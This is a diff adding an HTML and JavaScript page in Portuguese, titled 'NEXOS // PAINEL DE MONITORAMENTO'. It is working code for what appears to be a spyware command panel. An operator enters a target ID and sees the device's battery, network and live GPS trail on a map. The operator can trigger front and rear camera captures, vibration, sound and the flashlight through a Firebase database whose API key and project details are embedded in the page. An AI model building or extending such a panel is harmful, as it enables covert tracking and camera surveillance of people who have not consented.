@@ -1,0 +1,138 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NEXOS // PAINEL DE MONITORAMENTO</title>
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-database-compat.js"></script>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { background: #0a0a0a; color: #e2e8f0; font-family: 'Courier New', monospace; padding: 15px; }
+        .wrapper { max-width: 900px; margin: 0 auto; }
+        .header { text-align: center; margin-bottom: 20px; padding: 10px; border-bottom: 2px solid #1e293b; }
+        .header h1 { font-size: 20px; color: #38bdf8; letter-spacing: 3px; }
+        .search-box { background: #111; border: 1px solid #1e293b; padding: 20px; border-radius: 12px; text-align: center; margin-bottom: 20px; }
+        .search-box input { width: 100%; max-width: 300px; background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; color: #34d399; font-weight: bold; text-align: center; border-radius: 6px; font-size: 16px; margin-bottom: 15px; letter-spacing: 2px; }
+        .search-box button { background: #38bdf8; color: #0a0a0a; font-weight: bold; border: none; padding: 12px 30px; border-radius: 6px; cursor: pointer; text-transform: uppercase; font-size: 13px; }
+        .device-section { border: 1px solid #1e293b; border-radius: 12px; background: #111; padding: 15px; margin-bottom: 20px; display: none; }
+        .device-title { font-size: 14px; color: #34d399; text-transform: uppercase; border-bottom: 1px solid #1e293b; padding-bottom: 6px; margin-bottom: 12px; }
+        .info-grid { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; margin-bottom: 12px; }
+        .info-box { background: #0a0a0a; border: 1px solid #1e293b; padding: 12px; border-radius: 6px; text-align: center; }
+        .info-box span { font-size: 10px; color: #64748b; display: block; text-transform: uppercase; margin-bottom: 4px; }
+        .info-box strong { font-size: 18px; color: #f1f5f9; }
+        .map-container { width: 100%; height: 300px; border-radius: 8px; border: 1px solid #1e293b; margin-bottom: 10px; }
+        .btn-row { display: flex; gap: 8px; margin-bottom: 15px; flex-wrap: wrap; }
+        .btn-maps { flex: 1; background: #22c55e; color: #fff; text-align: center; padding: 12px; border-radius: 8px; font-weight: bold; text-decoration: none; text-transform: uppercase; font-size: 11px; }
+        .btn-cmd { background: #f59e0b; color: #000; border: none; padding: 12px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 11px; cursor: pointer; flex: 1; }
+        .btn-camera { display: block; width: 100%; background: #38bdf8; color: #0a0a0a; border: none; text-align: center; padding: 14px; border-radius: 8px; font-weight: bold; text-transform: uppercase; font-size: 13px; cursor: pointer; margin-bottom: 10px; }
+        .cameras-row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 15px; }
+        .cam-card { background: #0a0a0a; border: 1px solid #1e293b; border-radius: 8px; overflow: hidden; }
+        .cam-card-title { background: #111; padding: 8px; font-size: 11px; color: #64748b; border-bottom: 1px solid #1e293b; font-weight: bold; text-transform: uppercase; }
+        .cam-frame { width: 100%; aspect-ratio: 4/3; background: #000; display: flex; align-items: center; justify-content: center; }
+        .cam-frame img { width: 100%; height: 100%; object-fit: cover; display: none; }
+        .cam-placeholder { font-size: 11px; color: #334155; }
+        .error-box { background: #450a0a; border: 1px solid #991b1b; padding: 15px; border-radius: 8px; text-align: center; margin-bottom: 20px; color: #fca5a5; display: none; }
+        .status-dot { display: inline-block; width: 10px; height: 10px; border-radius: 50%; margin-right: 5px; }
+        .status-online { background: #22c55e; box-shadow: 0 0 10px #22c55e; animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.5; } 100% { opacity: 1; } }
+    </style>
+</head>
+<body>
+    <div class="wrapper">
+        <div class="header"><h1>NEXOS // PAINEL DE MONITORAMENTO</h1></div>
+        <div class="search-box">
+            <p>DIGITE O TARGET ID PARA CONECTAR</p>
+            <input type="text" id="targetId" placeholder="EX: NX-A4B7D1" required><br>
+            <button onclick="conectar()">Conectar Sinal</button>
+        </div>
+        <div class="error-box" id="errorBox">⚠️ ID NÃO ENCONTRADO</div>
+        <div class="device-section" id="deviceSection">
+            <div class="device-title">
+                <span><span class="status-dot status-online"></span> <span id="deviceIdLabel">--</span></span>
+                <span style="background:#166534;color:#4ade80;padding:4px 10px;border-radius:4px;font-size:11px;">ONLINE</span>
+            </div>
+            <div class="info-grid">
+                <div class="info-box"><span>🔋 Bateria</span><strong id="txtBateria" style="color:#22c55e;">--</strong></div>
+                <div class="info-box"><span>⏱️ Ativo</span><strong id="txtUptime">--</strong></div>
+                <div class="info-box"><span>📶 Rede</span><strong id="txtNetwork">--</strong></div>
+            </div>
+            <div id="map" class="map-container"></div>
+            <div class="btn-row">
+                <a id="lnkMaps" href="#" target="_blank" class="btn-maps">🗺️ Google Maps</a>
+                <button class="btn-cmd" onclick="enviarComando('vibrar')">📳</button>
+                <button class="btn-cmd" onclick="enviarComando('som')">🔊</button>
+                <button class="btn-cmd" onclick="enviarComando('lanterna')">💡</button>
+            </div>
+            <button class="btn-camera" onclick="enviarComando('take_dual')">📸 Capturar</button>
+            <div class="cameras-row">
+                <div class="cam-card"><div class="cam-card-title">🎥 Frontal</div><div class="cam-frame"><span id="labelFront" class="cam-placeholder">Sem Sinal</span><img id="imgFront"></div></div>
+                <div class="cam-card"><div class="cam-card-title">🎥 Traseira</div><div class="cam-frame"><span id="labelBack" class="cam-placeholder">Sem Sinal</span><img id="imgBack"></div></div>
+            </div>
+        </div>
+    </div>
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBVel91AWX8veFkXplDS5_SAMzpa5weULY",
+            authDomain: "nexos-40654.firebaseapp.com",
+            databaseURL: "https://nexos-40654-default-rtdb.firebaseio.com",
+            projectId: "nexos-40654",
+            storageBucket: "nexos-40654.firebasestorage.app",
+            messagingSenderId: "1034115302933",
+            appId: "1:1034115302933:web:cd693a0ca20df1fbef701c"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.database();
+        let map, marker, linha, pontos = [], deviceIdAtual = null;
+        map = L.map('map').setView([-16.6869, -49.2648], 17);
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
+        marker = L.marker([-16.6869, -49.2648]).addTo(map);
+        linha = L.polyline([], {color: '#38bdf8', weight: 3}).addTo(map);
+        
+        function conectar() {
+            const id = document.getElementById('targetId').value.trim().toUpperCase();
+            if (!id) return;
+            deviceIdAtual = id;
+            document.getElementById('deviceIdLabel').textContent = id;
+            db.ref('devices/' + id).on('value', (snapshot) => {
+                const data = snapshot.val();
+                if (data) {
+                    document.getElementById('deviceSection').style.display = 'block';
+                    document.getElementById('errorBox').style.display = 'none';
+                    document.getElementById('txtBateria').textContent = (data.battery || '--') + '%';
+                    document.getElementById('txtUptime').textContent = data.uptime || '--';
+                    document.getElementById('txtNetwork').textContent = data.network || '--';
+                    const lat = parseFloat(data.lat), lon = parseFloat(data.lon);
+                    if (lat && lon) {
+                        marker.setLatLng([lat, lon]);
+                        map.setView([lat, lon], map.getZoom());
+                        document.getElementById('lnkMaps').href = 'https://www.google.com/maps?q=' + lat + ',' + lon;
+                        pontos.push([lat, lon]);
+                        if (pontos.length > 100) pontos.shift();
+                        linha.setLatLngs(pontos);
+                    }
+                    if (data.photo_front) {
+                        document.getElementById('labelFront').style.display = 'none';
+                        document.getElementById('imgFront').src = 'data:image/jpeg;base64,' + data.photo_front;
+                        document.getElementById('imgFront').style.display = 'block';
+                    }
+                    if (data.photo_back) {
+                        document.getElementById('labelBack').style.display = 'none';
+                        document.getElementById('imgBack').src = 'data:image/jpeg;base64,' + data.photo_back;
+                        document.getElementById('imgBack').style.display = 'block';
+                    }
+                } else {
+                    document.getElementById('errorBox').style.display = 'block';
+                    document.getElementById('deviceSection').style.display = 'none';
+                }
+            });
+        }
+        function enviarComando(cmd) {
+            if (!deviceIdAtual) return;
+            db.ref('devices/' + deviceIdAtual + '/comando_remoto').set(cmd);
+        }
+    </script>
+</body>
+</html>
